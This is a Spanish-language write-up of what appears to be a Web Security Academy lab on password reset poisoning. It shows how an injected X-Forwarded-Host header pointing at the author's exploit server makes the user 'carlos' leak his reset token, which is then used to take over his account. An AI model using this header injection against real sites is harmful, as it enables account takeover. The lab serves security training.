![20250806010926.png](20250806010926.png)

En el sitio web encontramos un panel de login el cual tiene la opción de `Forgot password`

![20250807212003.png](20250807212003.png)

Al hacer click en esta opcion nos da a para ingresar un nombre de usuario o email.

![20250807212032.png](20250807212032.png)

En nuestro servidor de correo este nos da link con un token para resetear la password

![20250807211707.png](20250807211707.png)

Ahora podemos cambiar nuestra contraseña

![20250807212057.png](20250807212057.png)

Vamos al `BurpSuite`, en este podemos ver las solicitudes de cambio de contraseña.

![20250807211743.png](20250807211743.png)

Para explotar el sitio web, debemos entende de que es el `X-Forwarded`. Este es una cabecera HTTP no estándar (pero muy usada) que los **proxies inversos** (como Nginx, HAProxy, AWS ELB, etc.) utilizan para **preservar el nombre del host original** en una solicitud HTTP cuando el proxy redirige la petición a otro servidor.

Entendido esto, podemos hacer uso de esta cabecera para enviar la solicitud a nuestro servidor malicioso.

```c
X-Forwarded-Host: exploit-0a2a0001048b774f83f809d501de006d.exploit-server.net
```

Al enviar la solicitud vemos que este se envió correctamente.

![20250807211759.png](20250807211759.png)

En nuestro servidor malicioso también vemos los logs de la solicitud y un token para poder reestablecer la contraseña del usuario `carlos`

![20250807211829.png](20250807211829.png)

```c
https://[LAB].web-security-academy.net/forgot-password?temp-forgot-password-token=[token]
```

![20250807212414.png](20250807212414.png)

